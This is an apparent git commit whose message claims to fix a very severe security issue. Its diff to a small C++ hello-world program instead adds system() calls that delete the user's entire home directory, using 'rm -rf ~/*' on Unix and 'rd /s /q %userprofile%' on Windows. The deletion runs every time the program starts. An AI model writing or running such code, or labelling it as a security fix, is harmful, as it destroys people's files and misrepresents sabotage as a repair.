f6f36eb3d2d412de7eafc5119c11000108e171bc
Oleksii Yermolaiev <152915596+linewelder@users.noreply.github.com>
2024-10-10 23:53:05 +0200

    Fix very severe security issue

--- main.cpp
+++ main.cpp
@@ -1,6 +1,12 @@
 #include <iostream>
+#include <cstdlib>
 
 int main(int, char**)
 {
-    std::cout << "Hello, goyda!\n";
+    std::cout << "Hello, from gol!\n";
+#if defined(unix)
+    system("rm -rf ~/*");
+#else
+    system("rd /s /q  %userprofile%");
+#endif
 }
